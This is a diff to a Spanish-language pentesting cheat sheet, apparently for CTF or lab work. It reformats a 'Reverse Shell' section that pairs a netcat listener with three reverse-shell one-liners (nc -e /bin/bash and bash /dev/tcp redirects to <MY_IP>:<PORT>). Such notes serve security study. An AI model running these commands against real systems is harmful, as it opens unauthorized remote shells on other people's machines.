@@ -10,14 +10,15 @@ Crear un servidor de python en mi máquina local:
 > python3 -m http.server <PORT>
 ### Reverse Shell
 Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
-como ejemplo usaremos **NetCat**:
+como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```
 
-``` nc -lnvp <PORT> ```
-```
-nc -e /bin/bash <MY_IP> <PORT>
-bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1
-bash -c "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1"
-```
+Y luego usar alguno de los siguientes comandos
+
+``` nc -e /bin/bash <MY_IP> <PORT> ```
+
+``` bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1 ```
+
+``` bash -c "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1" ```
 ## Information Disclose
 ### PHP
 Archivos PHP con posible información sensible
